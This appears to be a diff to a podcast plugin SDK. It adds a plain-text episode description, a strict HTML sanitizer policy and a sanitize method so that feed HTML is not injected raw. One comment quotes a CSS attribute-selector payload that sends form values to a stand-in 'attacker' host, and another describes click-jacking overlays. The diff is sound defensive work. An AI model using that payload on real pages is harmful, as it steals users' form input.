@@ -1152,8 +1152,34 @@ function routeSegments(path: string): string[] {
 export interface DisplaySnapshot {
   /** The episode title from the feed. */
   title: string;
-  /** The episode description/show notes; may be empty. */
+  /**
+   * The episode's show notes **exactly as the third-party feed published them** — HTML; may be empty.
+   *
+   * **Untrusted input. Never assign it to `innerHTML` as it stands.** The host does not sanitize this
+   * field: it is whatever the podcast host put in the feed, fetched over the network, and anyone who can
+   * edit that feed controls it. The shell renders the same string only through its own sanitizer; a
+   * plugin that inserts it raw gets markup and CSS injection on a page with `style-src 'unsafe-inline'` —
+   * a full-viewport overlay, or attribute-selector CSS that exfiltrates form values. Either:
+   *
+   * - show {@link descriptionText} (plain text — the right choice for a card or a teaser), or
+   * - pass it through {@link PluginContext.sanitize} first, which applies the shell's own policy.
+   *
+   * ```ts
+   * body.innerHTML = ctx.sanitize(snap.description);   // never: body.innerHTML = snap.description
+   * ```
+   */
   description: string;
+  /**
+   * The same show notes as **plain text** — tags removed and entities decoded by the host. Never absent;
+   * empty when the feed has no description.
+   *
+   * Safe to put in `textContent` as it stands, and what a card, a teaser, a tooltip or a search excerpt
+   * should use. Whitespace between block elements is collapsed to single spaces, so it is one run of
+   * prose, not a layout.
+   *
+   * @since 0.16.0
+   */
+  descriptionText: string;
   /** The enclosure audio URL; absent for a `PLANNED` episode with no audio yet. */
   audioUrl?: string;
   /** The publication timestamp (ISO-8601 instant); absent for a `PLANNED` episode. */
@@ -1195,6 +1221,69 @@ export function resolveArtwork(snapshot: DisplaySnapshot): string | undefined {
 export const DISPLAY_BATCH_LIMIT = 200;
 
 /**
+ * The HTML policy the host applies to third-party markup — mirror of the shell's feed-HTML sanitizer,
+ * and what {@link PluginContext.sanitize} applies.
+ *
+ * Plain data, so the SDK stays dependency-free and the host can import this one object instead of
+ * keeping a copy. The names map one-to-one onto DOMPurify's config keys (`ALLOWED_TAGS`,
+ * `ALLOWED_ATTR`, `FORBID_TAGS`, `FORBID_ATTR`, `ALLOWED_URI_REGEXP`) for a plugin that must run its own
+ * sanitizer somewhere `ctx` does not reach — but prefer `ctx.sanitize`, which is the same decision
+ * without a dependency.
+ *
+ * ## Why not DOMPurify's defaults
+ *
+ * The defaults are built to stop *script execution*, and they do. They also permit `<style>` and the
+ * `style` attribute, filtering CSS only for `expression()` and `behavior:`, not for `url()`. The plugin
+ * contract requires `style-src 'unsafe-inline'` (Web Components style their shadow roots), and `img-src`
+ * stays open to any `https:` origin because artwork comes from arbitrary feed hosts. Together that makes
+ * any unsanitized stylesheet reachable, with two measured consequences:
+ *
+ * - a fixed, full-viewport, high-`z-index` block is **click-jacking** over the site chrome;
+ * - `input[value^="a"]{background-image:url(https://attacker/a)}` **exfiltrates** rendered form values
+ *   one character at a time.
+ *
+ * So the lists are narrow and explicit: prose, links, lists, tables and images. Widening one is a
+ * decision somebody makes on purpose; inheriting a default is a decision nobody made.
+ *
+ * @since 0.16.0
+ */
+export const FEED_HTML_POLICY: Readonly<{
+  /**
+   * Every element that survives. Anything else is unwrapped — the element goes, its text stays — except
+   * elements whose content is never prose (`script`, `style`, `template`, `iframe`, `svg`, …), which go
+   * with their content.
+   */
+  allowedTags: readonly string[];
+  /** Every attribute that survives, on any allowed element. */
+  allowedAttrs: readonly string[];
+  /**
+   * Elements that never survive, even if a later edit adds them to `allowedTags` — belt and braces, so
+   * widening one list cannot quietly reopen what this policy exists to close.
+   */
+  forbidTags: readonly string[];
+  /** Attributes removed even if a later edit adds them to `allowedAttrs`. */
+  forbidAttrs: readonly string[];
+  /** What an `href` or `src` may start with; anything else (`javascript:`, `data:`) is dropped. */
+  allowedUriRegexp: RegExp;
+  /** The `rel` put on every link that leaves the site, next to `target="_blank"`. */
+  externalLinkRel: string;
+}> = Object.freeze({
+  allowedTags: Object.freeze([
+    'a', 'abbr', 'b', 'blockquote', 'br', 'cite', 'code', 'dd', 'del', 'dl', 'dt', 'em', 'figcaption',
+    'figure', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'hr', 'i', 'img', 'ins', 'kbd', 'li', 'ol', 'p', 'pre',
+    'q', 's', 'samp', 'small', 'span', 'strong', 'sub', 'sup', 'table', 'tbody', 'td', 'tfoot', 'th',
+    'thead', 'tr', 'u', 'ul', 'var',
+  ]),
+  allowedAttrs: Object.freeze(['href', 'title', 'alt', 'src', 'width', 'height', 'lang', 'dir', 'colspan', 'rowspan']),
+  forbidTags: Object.freeze(['style', 'script', 'iframe', 'object', 'embed', 'form', 'input', 'link', 'base']),
+  forbidAttrs: Object.freeze(['style', 'srcset', 'formaction', 'ping']),
+  allowedUriRegexp: /^(?:https?:|mailto:|tel:|#|\/)/i,
+  // `noopener noreferrer` is mandatory with target=_blank; `nofollow ugc` because this markup is a third
+  // party's, published through the operator's site. The same string the server writes into the no-JS copy.
+  externalLinkRel: 'noopener noreferrer nofollow ugc',
+});
+
+/**
  * Read access to episode display snapshots — the frontend half of the Java `FeedAccess`.
  *
  * The Java contract could read a snapshot and the frontend could not, so a plugin that wanted to draw an
@@ -1216,6 +1305,9 @@ export const DISPLAY_BATCH_LIMIT = 200;
  * **Not authoritative, and it should keep saying so.** The snapshot is overwritten on every feed
  * refetch. That is a feature — a feed edit propagates — and the reason to read it live rather than copy
  * it. Cache per render, never per install.
+ *
+ * **`description` is untrusted third-party HTML** — see {@link DisplaySnapshot.description}. Show
+ * `descriptionText`, or run `description` through {@link PluginContext.sanitize}; never insert it raw.
  *
  * ```ts
  * const cards = await ctx.feeds.displayMany(ctx.episodes.slice(0, 20));
@@ -2384,6 +2476,39 @@ export interface PluginContext {
    * @since 0.9.0
    */
   feeds: FeedsClient;
+  /**
+   * Makes HTML your plugin did not write safe to put in `innerHTML` — with **the host's own policy**,
+   * the one the shell applies to feed HTML ({@link FEED_HTML_POLICY}).
+   *
+   * Use it for everything you did not author: a {@link DisplaySnapshot.description}, a user's or a
+   * podcaster's rich text, rendered Markdown, anything fetched. It exists so that a plugin cannot end up
+   * with a *weaker* policy than the host by writing less code: reaching for `DOMPurify.sanitize(html)`
+   * with library defaults lets `<style>` and `style=` through, which is exactly what the host refuses and
+   * why (see {@link FEED_HTML_POLICY}).
+   *
+   * What it does, and nothing else:
+   *
+   * - keeps only the allowed tags and attributes, dropping `<style>`, `<script>`, `<iframe>`, forms and
+   *   every `style`, `srcset` and event-handler attribute — including their content where that could run
+   *   or style anything;
+   * - drops an `href`/`src` that is not `http(s):`, `mailto:`, `tel:`, `#…` or a `/` path;
+   * - gives every link that leaves the site `target="_blank"` and `rel="noopener noreferrer nofollow ugc"`
+   *   — following one in the same tab would tear down the SPA and stop the player.
+   *
+   * Synchronous and never `null`: there is nothing to declare, because it grants nothing. Run it on the
+   * **final** HTML, after Markdown rendering — sanitizing the input and then transforming it undoes the
+   * point.
+   *
+   * ```ts
+   * root.querySelector('.notes')!.innerHTML = ctx.sanitize(snap.description);
+   * root.querySelector('.page')!.innerHTML = ctx.sanitize(marked.parse(markdown));
+   * ```
+   *
+   * @param html untrusted HTML; `null`, `undefined` and `''` all give `''`
+   * @returns HTML safe to assign to `innerHTML` inside your shadow root
+   * @since 0.16.0
+   */
+  sanitize(html: string | null | undefined): string;
   /**
    * The site's shared tag vocabulary, or **`null`** when the manifest declares no `tags` block
    * (ARCHITECTURE §6.1).
